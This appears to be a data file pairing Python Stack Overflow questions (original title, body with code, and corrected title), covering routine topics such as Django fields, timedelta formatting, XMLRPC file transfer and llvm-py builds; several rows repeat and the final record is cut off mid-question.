Is random.expovariate equivalent to a Possion Process, I read somewhere that the python library function random.expovariate produces intervals equivalent to Poisson Process events.Is that really the case or should I impose some other function on the results? <code> ,Is random.expovariate equivalent to a Poisson Process
python. built in functions," Is there a way to see how built in functions work in python? I don't mean just how to use them, but also how were they built, what is the code behind sorted or enumerate etc...? <code> ",Finding the source code for built-in Python functions?
python built-in functions?," Is there a way to see how built in functions work in python? I don't mean just how to use them, but also how were they built, what is the code behind sorted or enumerate etc...? <code> ",Finding the source code for built-in Python functions?
How to tell what python version libboots_python.so is using?, I'd like to know what version of python boost_python.so is expecting. This is on a computer with multiple python versions and I did not build/install boost myself (nor do i have root access).How can i tell what version of python boost_python.so is compiled for?I didn't find anything useful in the output from ldd but include it here incase someone else sees something. <code>  -bash-3.2$ ldd -v libboost_python.so.1.46.1 libutil.so.1 => /lib64/libutil.so.1 (0x00002ad65582d000)libpthread.so.0 => /lib64/libpthread.so.0 (0x00002ad655a30000)libdl.so.2 => /lib64/libdl.so.2 (0x00002ad655c4b000)librt.so.1 => /lib64/librt.so.1 (0x00002ad655e50000)libstdc++.so.6 => /usr/lib64/libstdc++.so.6 (0x00002ad656059000)libm.so.6 => /lib64/libm.so.6 (0x00002ad656359000)libgcc_s.so.1 => /lib64/libgcc_s.so.1 (0x00002ad6565dd000)libc.so.6 => /lib64/libc.so.6 (0x00002ad6567eb000)/lib64/ld-linux-x86-64.so.2 (0x000000374c600000)Version information:./libboost_python.so.1.46.1: libgcc_s.so.1 (GCC_3.0) => /lib64/libgcc_s.so.1 libpthread.so.0 (GLIBC_2.2.5) => /lib64/libpthread.so.0 libc.so.6 (GLIBC_2.4) => /lib64/libc.so.6 libc.so.6 (GLIBC_2.2.5) => /lib64/libc.so.6 libstdc++.so.6 (CXXABI_1.3) => /usr/lib64/libstdc++.so.6 libstdc++.so.6 (GLIBCXX_3.4) => /usr/lib64/libstdc++.so.6/lib64/libutil.so.1: libc.so.6 (GLIBC_2.2.5) => /lib64/libc.so.6/lib64/libpthread.so.0: ld-linux-x86-64.so.2 (GLIBC_2.3) => /lib64/ld-linux-x86-64.so.2 ld-linux-x86-64.so.2 (GLIBC_2.2.5) => /lib64/ld-linux-x86-64.so.2 ld-linux-x86-64.so.2 (GLIBC_PRIVATE) => /lib64/ld-linux-x86-64.so.2 libc.so.6 (GLIBC_2.3.2) => /lib64/libc.so.6 libc.so.6 (GLIBC_PRIVATE) => /lib64/libc.so.6 libc.so.6 (GLIBC_2.2.5) => /lib64/libc.so.6/lib64/libdl.so.2: ld-linux-x86-64.so.2 (GLIBC_PRIVATE) => /lib64/ld-linux-x86-64.so.2 libc.so.6 (GLIBC_PRIVATE) => /lib64/libc.so.6 libc.so.6 (GLIBC_2.2.5) => /lib64/libc.so.6/lib64/librt.so.1: ld-linux-x86-64.so.2 (GLIBC_PRIVATE) => /lib64/ld-linux-x86-64.so.2 libpthread.so.0 (GLIBC_2.2.5) => /lib64/libpthread.so.0 libpthread.so.0 (GLIBC_PRIVATE) => /lib64/libpthread.so.0 libc.so.6 (GLIBC_2.3.2) => /lib64/libc.so.6 libc.so.6 (GLIBC_2.2.5) => /lib64/libc.so.6 libc.so.6 (GLIBC_PRIVATE) => /lib64/libc.so.6/usr/lib64/libstdc++.so.6: ld-linux-x86-64.so.2 (GLIBC_2.3) => /lib64/ld-linux-x86-64.so.2 libgcc_s.so.1 (GCC_4.2.0) => /lib64/libgcc_s.so.1 libgcc_s.so.1 (GCC_3.3) => /lib64/libgcc_s.so.1 libgcc_s.so.1 (GCC_3.0) => /lib64/libgcc_s.so.1 libc.so.6 (GLIBC_2.3.2) => /lib64/libc.so.6 libc.so.6 (GLIBC_2.4) => /lib64/libc.so.6 libc.so.6 (GLIBC_2.3) => /lib64/libc.so.6 libc.so.6 (GLIBC_2.2.5) => /lib64/libc.so.6/lib64/libm.so.6: libc.so.6 (GLIBC_2.2.5) => /lib64/libc.so.6/lib64/libgcc_s.so.1: libc.so.6 (GLIBC_2.4) => /lib64/libc.so.6 libc.so.6 (GLIBC_2.2.5) => /lib64/libc.so.6/lib64/libc.so.6: ld-linux-x86-64.so.2 (GLIBC_2.3) => /lib64/ld-linux-x86-64.so.2 ld-linux-x86-64.so.2 (GLIBC_PRIVATE) => /lib64/ld-linux-x86-64.so.2,How to tell what python version libboost_python.so is using?
"differentiate null=True, blank=True in django"," When we add a database field in django we generally write: The same is done with ForeignKey, DecimalField etc. What is the basic difference in having null=True onlyblank=True onlynull=True, blank=Truein respect to different (CharField, ForeignKey, ManyToManyField, DateTimeField) fields. What are the advantages/disadvantages of using 1/2/3? <code>  models.CharField(max_length=100, null=True, blank=True)",What is the difference between null=True and blank=True in Django?
what does object's __init__() do in python?," While reading the code of OpenStack and I encountered this.A class named 'Service' inherits the base class 'object', and then in Service's __init__() method, object's __init__ is called. The related code looks like this:the class definition: and Service's init method definition: and a call to super(the 'object' here) in Service's init: I don't understand last call, object.__init__() what does it actually do?can anyone help? <code>  class Service(object): def __init__(self, host, binary, topic, manager, report_interval=None, periodic_interval=None, *args, **kwargs): super(Service, self).__init__(*args, **kwargs)",What does object's __init__() method do in python?
join 4 strings to the one if they are not empty in python," I have four strings and any of them can be empty. I need to join them into one string with spaces between them. If I use: The result is a blank space on the beginning of the new string if string1 is empty. Also, I have three blank spaces if string2 and string3 are empty. How can I easily join them without blank spaces when I don't need them? <code>  new_string = string1 + ' ' + string2 + ' ' + string3 + ' ' + string4",Joining multiple strings if they are not empty in Python
Importing a python module into a dict (for use as globals in eval())?," I'm using the Python execfile() function as a simple-but-flexible way of handling configuration files -- basically, the idea is: This requires that my configuration file has access to the definition of the Bar class. In this simple example, that's trivial; we can just define foo = {'Bar' : Bar} rather than an empty dict. However, in the real example, I have an entire module I want to load. One obvious syntax for that is: However, I've already imported BarModule in my top-level file, so it seems like I should be able to just directly define foo as the set of things defined by BarModule, without having to go through this chain of eval and import.Is there a simple idiomatic way to do that? <code>  # Evaluate the 'filename' file into the dictionary 'foo'.foo = {}execfile(filename, foo)# Process all 'Bar' items in the dictionary.for item in foo: if isinstance(item, Bar): # process item foo = {}eval('from BarModule import *', foo)execfile(filename, foo)",Importing a python module into a dict (for use as globals in execfile())?
Python- How to convert a measurement displayed in an architectual format to a floating point?," I have a database that was created and is used by an architecture firm. All measurements are stored in a format like this: 15-3/4"" and 12' 6-3/4"". Is there a way to convert these types of measurements into floating point in Python? Or is there a library out there that provides this functionality?Likewise, how would you convert from a floating point to the above format? <code> ",How to convert a measurement displayed in an architectural format to a floating point?
How to convert a measurement displayed in an architectual format to a floating point?," I have a database that was created and is used by an architecture firm. All measurements are stored in a format like this: 15-3/4"" and 12' 6-3/4"". Is there a way to convert these types of measurements into floating point in Python? Or is there a library out there that provides this functionality?Likewise, how would you convert from a floating point to the above format? <code> ",How to convert a measurement displayed in an architectural format to a floating point?
Why does raw_input create an infinite loop in this Learn Python the Hard Way exercise variant? (Newb)," I'm trying to work my way through Learn Python the Hard Way, and trying to mess around where I can to further my education. I thought this would work: set up raw_input to set a limit for a while loop, then let the while loop execute to the limit I establish with the variable ""frequency"". It, uh, doesn't. Instead, it sends Python into an infinite loop of creating number lists, each seeming to be one increment longer than the last (very long) list. The original code had ""while i < 6"" -- I've added the raw_input variable, and even if I enter the same variable as in the original code (6), it does this infinite-loop thing. Here's the full script: Apologies for maximum ignorance -- I've got a copy of Python for Software Design in front of me in paperback right now, and it's the next thing on my to-do list after LPTHW.  <code>  i = 0 numbers = []print ""What is the frequency?""frequency = raw_input ('Kenneth? ')while i < frequency: print ""At the top i is %d"" % i numbers.append(i) i = i + 1 print ""Numbers now: "", numbers print ""At the bottom i is %d"" % iprint ""The numbers: ""for num in numbers: print num",Why does raw_input create an infinite loop in this Learn Python the Hard Way exercise variant?
Python: name 'reduce' is not defined," I'm using Python 3.2. Tried this: And got the following error: Tried printing reduce into interactive console - got this error: Is reduce really removed in Python 3.2? If that's the case, what's the alternative? <code>  xor = lambda x,y: (x+y)%2l = reduce(xor, [1,2,3,4]) l = reduce(xor, [1,2,3,4])NameError: name 'reduce' is not defined NameError: name 'reduce' is not defined",NameError: name 'reduce' is not defined in Python
Python: How to write multiple strings in one line?," I've started to learn Python with LPTHW and I've gotten to exercise 16:http://learnpythonthehardway.org/book/ex16.htmlAnd feel like an idiot because I can't figure out one of the seemingly simple ""extra credit"" assignments that wants the following: To be condensed to one line of code. I've tried some of the following: Or: Or: I just can't get it to rewrite the line1, line2, and line3 strings all in the same line. And I've tried various other combinations with and without commas, quotes, etc. I keep getting varying errors, like Invalid Syntax or that I have too many arguments. <code>  target.write(line1)target.write('\n')target.write(line2)target.write('\n') target.write(line3)target.write('\n') target.write(line1 \n, line2 \n, line3 \n) target.write('line1 \n, line2 \n, line3 \n') target.write(%r \n, %r \n, %r \n) % (line1, line2, line3)",How to write multiple strings in one line?
Why dose a python descriptor __get__ method accept the owner class as an arg?," Why does the __get__ method in a python descriptor accept the owner class as it's third argument? Can you give an example of it's use?The first argument (self) is self evident, the second (instances) makes sense in the context of the typically shown descriptor pattern (ex to follow), but I've never really seen the third (owner) used. Can someone explain what the use case is for it?Just by way of reference and facilitating answers this is the typical use of descriptors I've seen: Given that instance.__class__ is available all I can think of is that explicitly passing the class has something to do with directly accessing the descriptor from the class instead of an instances (ex Container.managed_attr). Even so I'm not clear on what one would do in __get__ in this situation. <code>  class Container(object): class ExampleDescriptor(object): def __get__(self, instance, owner): return instance._name def __set__(self, instance, value): instance._name = value managed_attr = ExampleDescriptor()",Why does a python descriptor __get__ method accept the owner class as an arg?
Order of syntax for using 'not' and 'in' keywords," When testing for membership, we can use: Or alternatively: There can be many possible contexts for this expression depending on x and y. It could be for a substring check, list membership, dict key existence, for example.Are the two forms always equivalent? Is there a preferred syntax? <code>  x not in y not x in y","""x not in y"" or ""not x in y"""
why python timeit() executes endlessly?," When trying to use the Python built-in module 'timeit' as follows: it prints more than one line; why is that? It keeps printing ""hi"" endlessly: <code>  timeit.Timer('print ""hi""').timeit() hihihihi...",Why does Python's timeit() execute endlessly?
need to convert UTC (aws ec2) to PST in python," I need to convert UTC time, (on ec2 instance) to PST. I am trying to do this. But the output is: Any reason why I am not getting the right PST time? <code>  from datetime import datetimefrom pytz import timezoneimport pytzdate_format='%m/%d/%Y %H:%M:%S %Z'date = datetime.now()print 'Current date & time is:', date.strftime(date_format)my_timezone=timezone('US/Pacific')date = my_timezone.localize(date)date = date.astimezone(my_timezone)print 'Local date & time is :', date.strftime(date_format) Current date & time is: 01/10/2012 20:01:14Local date & time is : 01/10/2012 20:01:14 PST",need to convert UTC (aws ec2) to PST in Python
Using my own corupus for category classification in Python NLTK," I'm a NTLK/Python beginner and managed to load my own corpus using CategorizedPlaintextCorpusReader but how do I actually train and use the data for classification of text? <code>  >>> from nltk.corpus.reader import CategorizedPlaintextCorpusReader>>> reader = CategorizedPlaintextCorpusReader('/ebs/category', r'.*\.txt', cat_pattern=r'(.*)\.txt')>>> len(reader.categories())234",Using my own corpus for category classification in Python NLTK
Python: integers from excel files become floats?," I use xlrd to read data from excel files.For integers stored in the files, let's say 63, the xlrd interprets it as 63.0 of type number. Why can't xlrd recognize 63 as an integer? Assume sheet.row(1)[0].value gives us 63.0. How can I convert it back to 63. <code> ",Integers from excel files become floats?
Inheritance of attributes in python using _init_," I'm Java person who just started learning Python. Take this example: I'm sure there's a lot of redundant code (I know in Java, there are a lot of redundancies for the bit of code above). Which parts are redundant with respect to which attributes are already inherited from the parent class?  <code>  class Person(): def __init__(self, name, phone): self.name = name self.phone = phoneclass Teenager(Person): def __init__(self, name, phone, website): self.name=name self.phone=phone self.website=website",The inheritance of attributes using __init__
Inheritance of attributes in python using __init__," I'm Java person who just started learning Python. Take this example: I'm sure there's a lot of redundant code (I know in Java, there are a lot of redundancies for the bit of code above). Which parts are redundant with respect to which attributes are already inherited from the parent class?  <code>  class Person(): def __init__(self, name, phone): self.name = name self.phone = phoneclass Teenager(Person): def __init__(self, name, phone, website): self.name=name self.phone=phone self.website=website",The inheritance of attributes using __init__
formatting python timedelta objects," I have two datetime objects. I need to calculate the timedelta between them and then show the output in a specific format. An example of this Turnaround_TimeObj time delta is ""2 days, 22:13:45"". I want to format the output, but I am unable to do so. doesn't work.I know one way of doing this will be to convert it to seconds and then divmoding to get the required formatting.As in: But I was wondering if I can do it in a single line using any date time function like strftime.Actually converting to seconds doesn't work either. If I convert the time delta ""1 day, 3:42:54"" to seconds using: The totalSeconds value is shown as 13374 instead of 99774. i.e. it's ignoring the ""day"" value. <code>  Alpha_TimeObj = datetime.datetime(int(AlphaTime.strftime('%Y')), int(AlphaTime.strftime('%m')), int(AlphaTime.strftime('%d')), int(AlphaTime.strftime('%H')), int(AlphaTime.strftime('%M')), int(AlphaTime.strftime('%S')))Beta_TimeObj = datetime.datetime(int(BetaTime.strftime('%Y')), int(BetaTime.strftime('%m')), int(BetaTime.strftime('%d')), int(BetaTime.strftime('%H')), int(BetaTime.strftime('%M')), int(BetaTime.strftime('%S')))Turnaround_TimeObj = Beta_TimeObj - Alpha_TimeObj print Turnaround_TimeObj.strftime('%H hrs %M mins %S secs') totalSeconds = Turnaround_TimeObj.secondshours, remainder = divmod(totalSeconds, 3600)minutes, seconds = divmod(remainder, 60)print '%s:%s:%s' % (hours, minutes, seconds) totalSeconds = Turnaround_TimeObj.seconds",Formatting timedelta objects
What makes sets faster than lists in python?," The python wiki says: ""Membership testing with sets and dictionaries is much faster, O(1), than searching sequences, O(n). When testing ""a in b"", b should be a set or dictionary instead of a list or tuple.""I've been using sets in place of lists whenever speed is important in my code, but lately I've been wondering why sets are so much faster than lists. Could anyone explain, or point me to a source that would explain, what exactly is going on behind the scenes in python to make sets faster? <code> ",What makes sets faster than lists?
using dropbox as a server for my djagno app," I dont know if at all i make any sense, but this popped up in my mind. Can we use the 2gb free hosting of dropbox to put our django app over there and do some hacks to run our app? <code> ",using dropbox as a server for my django app
How to check blas/lapack linkage in numpy/scipy?," I am builing my numpy/scipy environment based on blas and lapack more or less based on this walk through. When I am done, how can I check, that my numpy/scipy functions really do use the previously built blas/lapack functionalities? <code> ",How to check BLAS/LAPACK linkage in NumPy and SciPy?
Is there a way for pip install to install only new dependencies in an updated requirements.txt, repeats the installation process for all the previously installed dependencies which can be a pain when I have a huge list of dependencies (like more than 30?)Isn't there a way to check an updated requirements.txt and install only specific dependencies that have been included into the requirements.txt file since the previous installation attempt?I find this to be a real shortcoming of pip (or using pip in virtualenv for that matter). Do not like the repetitive installation nature of pip at all. <code>  pip install --upgrade -r requirements.txt,Is there a way for pip to install only new dependencies in an updated requirements.txt
error in python TypeError: 'int' object is not subscriptable," I'm trying to create a simple program that tells you your lucky number according to numerology. I keep on getting this error: My script is: <code>  File ""number.py"", line 12, in <module> sumln = (int(sumall[0])+int(sumall[1]))TypeError: 'int' object is not subscriptable birthday = raw_input(""When is your birthday(mm/dd/yyyy)? "")summ = (int(birthday[0])+int(birthday[1]))sumd = (int(birthday[3])+int(birthday[4]))sumy= (int(birthday[6])+int(birthday[7])+int(birthday[8])+int(birthday[9]))sumall = summ + sumd + sumyprint ""The sum of your numbers is"", sumallsumln = (int(sumall[0])+int(sumall[1]))print ""Your lucky number is"", sumln` ",TypeError: 'int' object is not subscriptable
Building and running llvm-py on Mac OS X Lion," I was trying to build llvm-py on Mac OS X.This is what I tried to do, I needed to download 11vm-2.7, and the README file has this comment: Make sure '--enable-pic' is passed to LLVM's 'configure'Download llvm 2.7.Build llvm 2.7: Run ./configure --prefix=LLVM_DIRECTORY --enable-picDownload llvm-py 0.6.Build llvm-py 0.6: Run python setup.py build --llvm-config=LLVM_DIRECTORY/bin/llvm-configEverything compiles without errors, but when I tried to run test file, I got this error message. ImportError: 'dlopen(/Library/Python/2.7/site-packages/llvm/_core.so, 2): Symbol not found: __ZTVN4llvm16ExtractValueInstE\n Referenced from: /Library/Python/2.7/site-packages/llvm/_core.so\n Expected in: flat namespace\n in /Library/Python/2.7/site-packages/llvm/_core.so'The message error seems to say that there is a missing function ""llvmExtractValueInst"" with flat namemspace issue. What's wrong with this?In llvm 2.7, the Makefile.rules has this lineSharedLinkOptions=-Wl,-flat_namespace -Wl,-undefined -Wl,suppress \ -dynamiclibI tried to remove the flat_namespace, but I got compilation error.ADDEDFollowing locojay's answer, I could build brew and llvmpy. However, when I tried to execute the examples in the test directory, I still got different kind of error- This is the result when I run otool -L /Library/Python/2.7/site-packages/llvm/_core.so <code>  export REQUIRES_RTTI=1brew install llvm --rttisudo pip install git+https://github.com/llvmpy/llvmpy test> python example.py Traceback (most recent call last): File ""example.py"", line 4, in <module> from llvm import * File ""/Library/Python/2.7/site-packages/llvm/__init__.py"", line 11, in <module> from llvm import _coreImportError: dlopen(/Library/Python/2.7/site-packages/llvm/_core.so, 2): Symbol not found: __ZN4llvm10DataLayout2IDE Referenced from: /Library/Python/2.7/site-packages/llvm/_core.so Expected in: flat namespace in /Library/Python/2.7/site-packages/llvm/_core.so /Library/Python/2.7/site-packages/llvm/_core.so:/usr/lib/libSystem.B.dylib (compatibility version 1.0.0, current version 159.1.0)/usr/lib/libstdc++.6.dylib (compatibility version 7.0.0, current version 52.0.0)",Building and running llvm-py on Mac OS X
"list comprehension without [ ], Python"," Joining a list: join must take an iterable.Apparently, join's argument is [ str(_) for _ in xrange(10) ], and it's a list comprehension.Look at this: Now, join's argument is just str(_) for _ in xrange(10), no [], but the result is the same.Why? Does str(_) for _ in xrange(10) also produce a list or an iterable? <code>  >>> ''.join([ str(_) for _ in xrange(10) ])'0123456789' >>>''.join( str(_) for _ in xrange(10) )'0123456789'",List comprehension without [ ] in Python
aren't python strings immutable?," My understanding was that Python strings are immutable.I tried the following code: Shouldn't Python have prevented the assignment? I am probably missing something.Any idea? <code>  a = ""Dog""b = ""eats""c = ""treats""print a, b, c# Dog eats treatsprint a + "" "" + b + "" "" + c# Dog eats treatsprint a# Doga = a + "" "" + b + "" "" + cprint a# Dog eats treats# !!!","Aren't Python strings immutable? Then why does a + "" "" + b work?"
Aren't python strings immutable?," My understanding was that Python strings are immutable.I tried the following code: Shouldn't Python have prevented the assignment? I am probably missing something.Any idea? <code>  a = ""Dog""b = ""eats""c = ""treats""print a, b, c# Dog eats treatsprint a + "" "" + b + "" "" + c# Dog eats treatsprint a# Doga = a + "" "" + b + "" "" + cprint a# Dog eats treats# !!!","Aren't Python strings immutable? Then why does a + "" "" + b work?"
Aren't Python strings immutable?," My understanding was that Python strings are immutable.I tried the following code: Shouldn't Python have prevented the assignment? I am probably missing something.Any idea? <code>  a = ""Dog""b = ""eats""c = ""treats""print a, b, c# Dog eats treatsprint a + "" "" + b + "" "" + c# Dog eats treatsprint a# Doga = a + "" "" + b + "" "" + cprint a# Dog eats treats# !!!","Aren't Python strings immutable? Then why does a + "" "" + b work?"
Python: Send file from client to server using XMLRPC?," I want to write Python code to send a file from client to server. server needs to save the file sent from the client. But my code have some bugs which I cannot fix. Below is my server code: And the client code: But then I run my code, the client returns the following error (this is on Windows): I have some questions:How to fix the above bug?My code needs to transfer some big files sometimes. Since my method is so simple, I doubt that it is efficient for moving big data. Could anybody please suggest a better method to move big files? (Of course it is better to use XMLRPC on Python) <code>  # server.pyfrom SimpleXMLRPCServer import SimpleXMLRPCServerimport osserver = SimpleXMLRPCServer(('localhost', 9000))def save_data(data): handle = open(""x123.dat"", ""wb"") handle.write(data) handle.close()server.register_function(save_data, 'save_data')server.serve_forever() # client.pyimport sys, xmlrpclibproxy = xmlrpclib.Server('http://localhost:9000')handle = open(sys.argv[1], ""rb"")proxy.save_data(handle.read())handle.close() Traceback (most recent call last):File ""client.py"", line 6, in <module> proxy.save_data(handle.read())File ""c:\python27\lib\xmlrpclib.py"", line 1224, in __call__ return self.__send(self.__name, args)File ""c:\python27\lib\xmlrpclib.py"", line 1575, in __request verbose=self.__verboseFile ""c:\python27\lib\xmlrpclib.py"", line 1264, in request return self.single_request(host, handler, request_body, verbose)File ""c:\python27\lib\xmlrpclib.py"", line 1297, in single_request return self.parse_response(response)File ""c:\python27\lib\xmlrpclib.py"", line 1473, in parse_response return u.close()File ""c:\python27\lib\xmlrpclib.py"", line 793, in close raise Fault(**self._stack[0])xmlrpclib.Fault: <Fault 1: ""<class 'xml.parsers.expat.ExpatError'>:not well-formed (invalid token): line 7, column 1"">",Send file from client to server using XMLRPC?
Is there a way to write this nicer?," I need to write these four ifs in Python. Notice what it does, is changing between four possible states in a loop: 1,0 -> 0,1 -> -1,0 -> 0,-1 and back to first. Can anyone suggest me a better/nicer way to write this? <code>  if [dx, dy] == [1,0]: dx, dy = 0, 1if [dx, dy] == 0, 1: dx, dy = -1, 0if [dx, dy] == [-1, 0] dx, dy = 0, -1if [dx, dy] == [0, -1]: dx, dy = 1, 0",Is there a way to write these ifs nicer?
Python - write data into csv format as string (not file)," I want to cast data like [1,2,'a','He said ""what do you mean?""'] to a CSV-formatted string. Normally one would use csv.writer() for this, because it handles all the crazy edge cases (comma escaping, quote mark escaping, CSV dialects, etc.) The catch is that csv.writer() expects to output to a file object, not to a string.My current solution is this somewhat hacky function: Can anyone give a more elegant solution that still handles the edge cases well?Edit: Here's how I ended up doing it: <code>  def CSV_String_Writeline(data): class Dummy_Writer: def write(self,instring): self.outstring = instring.strip(""\r\n"") dw = Dummy_Writer() csv_w = csv.writer( dw ) csv_w.writerow(data) return dw.outstring def csv2string(data): si = StringIO.StringIO() cw = csv.writer(si) cw.writerow(data) return si.getvalue().strip('\r\n')",How do I write data into CSV format as string (not file)?
How do I write data into csv format as string (not file)?," I want to cast data like [1,2,'a','He said ""what do you mean?""'] to a CSV-formatted string. Normally one would use csv.writer() for this, because it handles all the crazy edge cases (comma escaping, quote mark escaping, CSV dialects, etc.) The catch is that csv.writer() expects to output to a file object, not to a string.My current solution is this somewhat hacky function: Can anyone give a more elegant solution that still handles the edge cases well?Edit: Here's how I ended up doing it: <code>  def CSV_String_Writeline(data): class Dummy_Writer: def write(self,instring): self.outstring = instring.strip(""\r\n"") dw = Dummy_Writer() csv_w = csv.writer( dw ) csv_w.writerow(data) return dw.outstring def csv2string(data): si = StringIO.StringIO() cw = csv.writer(si) cw.writerow(data) return si.getvalue().strip('\r\n')",How do I write data into CSV format as string (not file)?
Python / MySQL (MySQLdb) - testing the 'insert' function - its not adding rows. Why?," I'm trying to figure out how to use the MySQLdb library in Python (I am novice at best for both of them).I'm following the code here, specifically: I can change this code to create or drop tables, but I can't get it to actually commit the INSERT. It returns the row.count value as expected (even when I change the value in the table, it changes to what I expect it to be). Every time I look into the database with PHPMyAdmin there are no inserts made. How do I commit the INSERT to the database? <code>  cursor = conn.cursor ()cursor.execute (""DROP TABLE IF EXISTS animal"")cursor.execute ("""""" CREATE TABLE animal ( name CHAR(40), category CHAR(40) ) """""")cursor.execute ("""""" INSERT INTO animal (name, category) VALUES ('snake', 'reptile'), ('frog', 'amphibian'), ('tuna', 'fish'), ('racoon', 'mammal') """""")print ""Number of rows inserted: %d"" % cursor.rowcountcursor.close ()conn.close ()",Why isn't the 'insert' function adding rows using MySQLdb?
Threading and infromatiion passing -- how to," To reframe from confusion i have edited the question:one.py but my confusion here is I am able to put and get values from queue between threads but in case of count it does not reflect. Why is that?What is point am actually missing here? <code>  import threadingcount = 5dev = threading.Thread(name='dev', target=dev,args=(workQueue,count,))dev.setDaemon(True)dev.start()workQueue = Queue.Queue(10)queueLock.acquire()workQueue.put(word)queueLock.release()count = 3time.sleep(2)count = 5 class dev ( threading.Thread ): def test(self): while 1: print count print self.EPP_Obj queueLock.acquire() if not self.workQueue.empty(): data = self.workQueue.get() print data queueLock.release() else: queueLock.release() def __init__(self, workQueue, EPP_Obj): threading.Thread.__init__(self) self.workQueue = workQueue self.EPP_Obj = EPP_Obj",Threading and information passing -- how to
Django: how to hide label with ModelForm?," i have the following, but why does this not hide the label for book comment? I get the error 'textfield' is not defined: <code>  from django.db import modelsfrom django.forms import ModelForm, Textareaclass Booklog(models.Model): Author = models.ForeignKey(Author) Book_comment = models.TextField() Bookcomment_date = models.DateTimeField(auto_now=True)class BooklogForm(ModelForm): #book_comment = TextField(label='') class Meta: model = Booklog exclude = ('Author') widgets = {'book_entry': Textarea(attrs={'cols': 45, 'rows': 5}, label={''}),} ",Django: how to hide/overwrite default label with ModelForm?
python dictionary and default values," Assuming connectionDetails is a Python dictionary, what's the best, most elegant, most ""pythonic"" way of refactoring code like this? <code>  if ""host"" in connectionDetails: host = connectionDetails[""host""]else: host = someDefaultValue",Dictionaries and default values
Web Based Chat Server in Python," I am working on a homework project for a Networking class where we have to build a simple web based chat server in either C/C++ or Python. I chose Python because I thought it would be an easier language to implement the project in. We can use any material we find on the web, because it most likely won't have all the functionality that the project requires. In fact, the professor actually encouraged us to use material from the web including tutorials. He's not testing us on our ability to code rather our ability to implement networking code, and whether or not we fully understand the processes involved.The project must handle multiple clients, and must be able to support multiple browsers, chrome, firefox, etc. A user needs to be able to type in an IP Address and a Port in the browser to connect. I just can't find any material to work with. I have found a little in C but nothing in Python.Does anyone know of any complete tutorials out there? There are plenty for client/server command-based chats, but no browser based chats. <code> ",A tutorial for a web-based chat server in Python
"Python: A nicer way to assign a set with the contents of a list if the list isnt empty, otherwise another list"," I'm looking for a nicer way to assign a set with the conent of a list if such list is not empty, otherwise another list should be used.If it is possible I'd like a nicer way to write this (or an argument to why this is the nicest way): <code>  if args.onlyTheseServers: only = set(args.onlyTheseServers)else: only = set(availableServers)","Convert one list to set, but if empty use a default one"
Trouble importing my own modules in python," I'm having a hard time understanding how module importing works in Python (I've never done it in any other language before either).Let's say I have: Now I'm trying to get something like this: However, I'm definitely doing something wrong as Python can't see that myapp is a module: <code>  myapp/__init__.pymyapp/myapp/myapp.pymyapp/myapp/SomeObject.pymyapp/tests/TestCase.py myapp.py===================from myapp import SomeObject# stuff ...TestCase.py===================from myapp import SomeObject# some tests on SomeObject ImportError: No module named myapp",Can't import my own modules in Python
default color cycle with matplotlib," How can I set a default set of colors for plots made with matplotlib? I can set a particular color map like this but is there some way to set the same set of colors for all plots, including subplots? <code>  import numpy as npimport matplotlib.pyplot as pltfig=plt.figure(i)ax=plt.gca()colormap = plt.get_cmap('jet')ax.set_color_cycle([colormap(k) for k in np.linspace(0, 1, 10)])",How to set the default color cycle for all subplots with matplotlib?
Does urllib2.request has retry option?," When urllib2.request reaches timeout, a urllib2.URLError exception is raised.What is the pythonic way to retry establishing a connection? <code> ",How to retry urllib2.request when fails?
Does urllib2.request have a retry option?," When urllib2.request reaches timeout, a urllib2.URLError exception is raised.What is the pythonic way to retry establishing a connection? <code> ",How to retry urllib2.request when fails?
How to retry urllib2.request when failed?," When urllib2.request reaches timeout, a urllib2.URLError exception is raised.What is the pythonic way to retry establishing a connection? <code> ",How to retry urllib2.request when fails?
Python: Find words and combinations of words that can be spoken the quickest," I'm a big fan of discovering sentences that can be rapped very quickly. For example, ""gotta read a little bit of Wikipedia"" or ""don't wanna wind up in the gutter with a bottle of malt."" (George Watsky) I wanted to write a program in Python that would enable me to find words (or combinations of words) that can be articulated such that it sounds very fast when spoken. I initially thought that words that had a high syllable to letter ratio would be the best, but upon writing a Python program to do find those words, I retrieved only very simple words that didn't really sound fast (e.g. ""iowa""). So I'm at a loss at what actually makes words sound fast. Is it the morpheme to letter ratio? Is it the number of alternating vowel-consonant pairs? How would you guys go about devising a python program to resolve this problem? <code> ",Find words and combinations of words that can be spoken the quickest
How to build a MenuBar app for Windows?," I usually work on a Linux system, but I have a situation where I need to write a client app that would run on windows as a service. Can someone help me or direct, on how to build a system tray app (for example like dropbox) for the windows environment, which gets started on OS startup and the icon sits in the TaskBar and on clicking the app icon presents a menu.My scripting language is python. Thanks. <code> ",How to build a SystemTray app for Windows?
create dictionary from list of variables," I'm looking for a way to create a dictionary without writing the key explicitly.I want to create a function that gets the number of variables and creates a dictionary where the variable names are the keys and their values are the variable values.Instead of writing the following function: I want to get the same result with function : Is there any way to do so? <code>  def foo(): first_name = ""daniel"" second_name = ""daniel"" id = 1 return {'first_name':first_name, 'second_name':second_name} create_dict_from_variables(first_name, second_name)",Create dictionary from list of variables
Django not serving media/static files," Let me thanks you guys at the Stack Overflow community for helping me with various Django and Apache (with mod_wsgi) errors. I've asked about 5 related questions so far and now I'm getting closer and closer to getting my content out on a production site!So I know there are many similar questions about this and I have read a bunch of questions about serving static media files on Django.I read about STATIC_URL, STATIC_ROOT, the (soon to be obsolete) ADMIN_MEDIA_PREFIX, and setting a Alias /media/ ... in the Apache configuration. I tried to test out each solution one by one, but I couldn't get anything working.Here is what my admin site looks like right nowI'm also having a weird case where any subdomain works on my server. For example I was trying to set up my server so that http://www.satoshi.example.com/ would allow my normal (non-Django) content, while http://django.satoshi.example.com/ would allow my Django content to be served. But currently any subdomain, whether satoshi.example.com or blahblahasdas.satoshi.example.com is serving my Django files (I know because I can go to the /admin page on both site, although they will be in different sessions).Anyway here are my files on the server which is running CentOS (not sure which version), Apache 2.2.15, Python 2.6.6, django 1.3.1, and mod_wsgi 3.2.I will post what I think is the most relevant files and configuration below:Apache throws these errors everytime I restart Here is /var/www/html/mysite/apache/apache_django_wsgi.conf which gets loaded into my httpd.conf with the option NameVirtualHost *:80 Here is /var/www/html/mysite/apache/django.wsgi And finally here is part of /var/www/html/mysite/settings.py Let me know if you guys need any other files. Thanks in advance! <code>  [Wed Feb 29 01:45:36 2012] [error] Exception KeyError: KeyError(140249420548064,) in <module 'threading' from '/usr/lib64/python2.6/threading.pyc'> ignored[Wed Feb 29 01:45:36 2012] [error] Exception KeyError: KeyError(140249420548064,) in <module 'threading' from '/usr/lib64/python2.6/threading.pyc'> ignored[Wed Feb 29 01:45:36 2012] [error] Exception KeyError: KeyError(140249420548064,) 